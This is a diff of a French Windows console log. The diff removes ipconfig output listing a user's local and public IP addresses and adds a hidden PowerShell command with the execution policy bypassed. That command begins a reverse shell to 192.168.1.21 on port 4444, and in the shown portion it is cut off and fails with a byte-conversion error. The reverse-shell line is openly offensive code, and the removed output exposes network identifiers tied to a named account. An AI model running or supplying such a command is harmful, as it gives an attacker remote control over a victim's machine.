@@ -1,44 +1,15 @@
 Microsoft Windows [version 6.3.9600]
 (c) 2013 Microsoft Corporation. Tous droits r‚serv‚s.
 
-C:\Users\mickael\Desktop>cmd /k ipconfig
-
-Configuration IP de Windows
-
-
-Carte Ethernet Ethernet 5 :
-
-   Statut du m‚dia. . . . . . . . . . . . : M‚dia d‚connect‚
-   Suffixe DNS propre … la connexion. . . : 
-
-Carte Ethernet Ethernet 4 :
-
-   Statut du m‚dia. . . . . . . . . . . . : M‚dia d‚connect‚
-   Suffixe DNS propre … la connexion. . . : 
-
-Carte Ethernet Ethernet 3 :
-
-   Statut du m‚dia. . . . . . . . . . . . : M‚dia d‚connect‚
-   Suffixe DNS propre … la connexion. . . : 
-
-Carte Ethernet Ethernet 2 :
-
-   Suffixe DNS propre … la connexion. . . : 
-   Adresse IPv6. . . . . . . . . . .ÿ. . .: 2a01:e0a:bb7:490:b06a:ab6a:35e7:c26
-   Adresse IPv6 temporaire . . . . . . . .: 2a01:e0a:bb7:490:fd29:1824:4616:a006
-   Adresse IPv6 de liaison locale. . . . .: fe80::b06a:ab6a:35e7:c26%5
-   Adresse IPv4. . . . . . . . . . . . . .: 192.168.1.43
-   Masque de sous-r‚seau. . . .ÿ. . . . . : 255.255.255.0
-   Passerelle par d‚faut. . . .ÿ. . . . . : fe80::224:d4ff:fea0:2c04%5
-	                               192.168.1.254
-
-Carte Ethernet Ethernet :
-
-   Suffixe DNS propre … la connexion. . . : 
-   Adresse IPv6 de liaison locale. . . . .: fe80::38d8:9d06:cc23:c4e1%3
-   Adresse IPv4. . . . . . . . . . . . . .: 10.0.2.15
-   Masque de sous-r‚seau. . . .ÿ. . . . . : 255.255.255.0
-   Passerelle par d‚faut. . . .ÿ. . . . . : 10.0.2.2
+C:\Users\mickael\Desktop>cmd /k powershell.exe -NoP -sta -NonI -W Hidden -ep bypass -c $client = New-Object System.Net.Sockets.TCPClient('192.168.1.21',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535
+Impossible de convertir la valeur ®256¯ en type ®System.Byte¯. Erreur: ®La valeur ‚tait trop 
+grande ou trop petite pour un octet non sign‚.¯
+Au caractŠre Ligne:1 : 102
++ ... 8.1.21',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535
++                                                 ~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : MetadataError: (:) [], ArgumentTransformationMetadataException
+    + FullyQualifiedErrorId : RuntimeException
+ 
 
 C:\Users\mickael\Desktop>
 C:\Users\mickael\Desktop>
